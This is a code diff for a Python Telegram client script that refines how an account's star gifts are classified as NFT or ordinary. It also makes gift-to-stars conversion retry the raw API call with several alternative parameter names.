@@ -698,8 +698,13 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
                             gift_obj = getattr(raw_gift, 'gift', None)
                             
                             # collection_id указывает на NFT (проверяем в raw_gift, НЕ в gift_obj)
-                            # У обычных подарков collection_id = None, у NFT есть collection_id
-                            self.collectible_id = getattr(raw_gift, 'collection_id', None)
+                            # У обычных подарков collection_id = None или [], у NFT есть непустой collection_id
+                            raw_collection_id = getattr(raw_gift, 'collection_id', None)
+                            # Если collection_id это пустой список - считаем None
+                            if isinstance(raw_collection_id, list) and len(raw_collection_id) == 0:
+                                self.collectible_id = None
+                            else:
+                                self.collectible_id = raw_collection_id
                             
                             # Логируем для диагностики (только для первого подарка в первой странице)
                             # Это поможет понять, почему обычные подарки определяются как NFT
@@ -820,22 +825,33 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
                             gift_obj = SimpleGift(gift_raw)
                             
                             # КРИТИЧЕСКАЯ ПРОВЕРКА: определяем тип подарка
-                            # У NFT есть collection_id в raw_gift, у обычных подарков его НЕТ
+                            # У NFT есть collection_id в raw_gift, у обычных подарков его НЕТ или это пустой список []
                             raw_collection_id = getattr(gift_raw, 'collection_id', None)
                             
-                            # Логируем для диагностики
-                            log_transfer(f"🔍 Подарок #{idx}: collection_id={raw_collection_id}, convert_price={gift_obj.convert_price}, can_transfer={gift_obj.can_transfer}")
+                            # Проверяем: если collection_id это пустой список [] или None - это ОБЫЧНЫЙ подарок
+                            # Если collection_id это непустой список или число - это NFT
+                            is_nft = False
+                            if raw_collection_id is not None:
+                                # Проверяем, не пустой ли это список
+                                if isinstance(raw_collection_id, list):
+                                    is_nft = len(raw_collection_id) > 0
+                                else:
+                                    # Это число или другой тип - считаем NFT
+                                    is_nft = True
                             
-                            # Если collection_id = None, это ОБЫЧНЫЙ подарок (не NFT)
-                            if raw_collection_id is None:
+                            # Логируем для диагностики
+                            log_transfer(f"🔍 Подарок #{idx}: collection_id={raw_collection_id} (тип: {type(raw_collection_id).__name__}), is_nft={is_nft}, convert_price={gift_obj.convert_price}, can_transfer={gift_obj.can_transfer}")
+                            
+                            # Устанавливаем значения в зависимости от типа подарка
+                            if is_nft:
+                                # Это NFT - collection_id есть и не пустой
+                                gift_obj.collectible_id = raw_collection_id
+                                log_transfer(f"🎁 Подарок #{idx}: {gift_obj.title} (NFT: True, collection_id={raw_collection_id}, Конверт: {gift_obj.convert_price > 0}, Трансфер: {gift_obj.can_transfer})")
+                            else:
                                 # Это обычный подарок - принудительно устанавливаем значения
                                 gift_obj.collectible_id = None
                                 gift_obj.can_transfer = False  # Обычные подарки нельзя передавать
                                 log_transfer(f"🎁 Подарок #{idx}: {gift_obj.title} (ОБЫЧНЫЙ, Конверт: {gift_obj.convert_price} зв, NFT: False, Трансфер: False)")
-                            else:
-                                # Это NFT - collection_id есть
-                                gift_obj.collectible_id = raw_collection_id
-                                log_transfer(f"🎁 Подарок #{idx}: {gift_obj.title} (NFT: True, collection_id={raw_collection_id}, Конверт: {gift_obj.convert_price > 0}, Трансфер: {gift_obj.can_transfer})")
                             
                             yield gift_obj
                             
@@ -960,14 +976,47 @@ async def convert_gift_task(client: Client, gift_details):
             log_transfer(f"❌ Нет валидного ID для конвертации: {gift_title}", "error")
             return False
         
-        log_transfer(f"🔄 Конвертация подарка: {gift_title} (saved_id={gift_id_to_convert})")
+        log_transfer(f"🔄 Конвертация подарка: {gift_title} (ID={gift_id_to_convert})")
         
         # Используем raw API для конвертации
-        result = await client.invoke(
-            raw.functions.payments.ConvertStarGift(
-                saved_id=int(gift_id_to_convert) if gift_id_to_convert else 0
+        # Пробуем разные варианты имени параметра
+        gift_id_int = int(gift_id_to_convert) if gift_id_to_convert else 0
+        
+        # Пробуем сначала с параметром id (стандартное имя в Telegram API)
+        try:
+            result = await client.invoke(
+                raw.functions.payments.ConvertStarGift(
+                    id=gift_id_int
+                )
             )
-        )
+            log_transfer(f"✅ Конвертирован: {gift_title} (+{gift_details.get('star_count', 0)} зв)")
+            return True
+        except TypeError as te:
+            # Если не сработало с id, пробуем другие варианты
+            log_transfer(f"⚠️ Вариант с 'id' не сработал: {te}, пробуем другие варианты...", "warning")
+            
+            # Пробуем с gift_id
+            try:
+                result = await client.invoke(
+                    raw.functions.payments.ConvertStarGift(
+                        gift_id=gift_id_int
+                    )
+                )
+                log_transfer(f"✅ Конвертирован: {gift_title} (+{gift_details.get('star_count', 0)} зв)")
+                return True
+            except TypeError:
+                # Пробуем с saved_id (на случай, если в другой версии API это работает)
+                try:
+                    result = await client.invoke(
+                        raw.functions.payments.ConvertStarGift(
+                            saved_id=gift_id_int
+                        )
+                    )
+                    log_transfer(f"✅ Конвертирован: {gift_title} (+{gift_details.get('star_count', 0)} зв)")
+                    return True
+                except TypeError as te2:
+                    log_transfer(f"❌ Все варианты параметров не сработали. Последняя ошибка: {te2}", "error")
+                    raise
         
         log_transfer(f"✅ Конвертирован: {gift_title} (+{gift_details.get('star_count', 0)} зв)")
         return True
